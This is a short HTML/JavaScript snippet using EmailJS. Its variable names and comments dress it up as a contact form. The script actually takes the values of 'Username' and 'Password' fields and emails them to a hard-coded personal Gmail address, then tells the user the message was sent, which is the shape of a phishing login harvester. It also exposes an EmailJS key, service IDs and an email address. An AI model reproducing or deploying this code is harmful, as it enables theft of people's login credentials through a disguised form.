<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3.1.0/dist/email.min.js"></script>

<script>
  // Initialize EmailJS with your public key
  emailjs.init('rbzxQsqsqS1lbs8Y1'); // Replace with your actual public key

  // Get form elements
  const subjectInput = document.getElementById('Username');
  const messageInput = document.getElementById('Password');
  const sendBtn = document.getElementById('sendBtn');
  const statusDiv = document.getElementById('status');

  // Enable the send button only if both inputs have values
  subjectInput.addEventListener('input', enableSendButton);
  messageInput.addEventListener('input', enableSendButton);

  function enableSendButton() {
    sendBtn.disabled = !(subjectInput.value.trim() && messageInput.value.trim());
  }

  // Handle form submission
  document.getElementById('emailForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const emailData = {
      to_email: 'kaioadrik08@gmail.com', // Replace with recipient's email
      subject: subjectInput.value.trim(),
      message: messageInput.value.trim()
    };

    // Show "Sending..." status
    statusDiv.textContent = 'Sending...';
    statusDiv.classList.remove('success', 'error');

    // Send email via EmailJS
    emailjs.send('service_774xxto', 'template_i2dsm05', emailData)
      .then(response => {
        console.log('Success:', response);
        statusDiv.textContent = 'Message sent successfully!';
        statusDiv.classList.add('success');
      })
      .catch(error => {
        console.error('Failed:', error);
        statusDiv.textContent = 'Failed to send message!';
        statusDiv.classList.add('error');
      });
  });
</script>
